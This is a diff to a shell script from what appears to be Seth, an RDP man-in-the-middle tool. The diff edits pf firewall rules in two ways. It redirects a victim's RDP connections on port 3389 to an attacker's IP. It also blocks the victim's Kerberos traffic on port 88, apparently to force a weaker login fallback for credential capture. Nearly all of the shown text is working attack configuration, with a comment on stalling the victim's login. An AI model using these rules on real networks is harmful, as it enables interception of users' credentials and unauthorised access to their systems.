@@ -124,7 +124,8 @@ set_pf_1 () {
 set_pf_2 () {
     rm $PF_TMP_FILE 2>/dev/null 1>&2
 
-    echo "rdr on $IFACE inet proto tcp from $VICTIM_IP to $ORIGINAL_DEST port 3389 -> $ATTACKER_IP" >> $PF_TMP_FILE
+    echo "rdr pass on $IFACE inet proto tcp from $VICTIM_IP to $ORIGINAL_DEST port 3389 -> $ATTACKER_IP" >> $PF_TMP_FILE
+    echo "block return-rst out on $IFACE proto tcp from $VICTIM_IP to any port 88" >> $PF_TMP_FILE
 
     # After vi tim clicks on "OK" in the login dialog, Seth starts an infinite loop triggering the error on seth/main.py:58
     # Since there's no credentials yet and the connection is not in a dirty state, the loop is infinite and the connection is never established
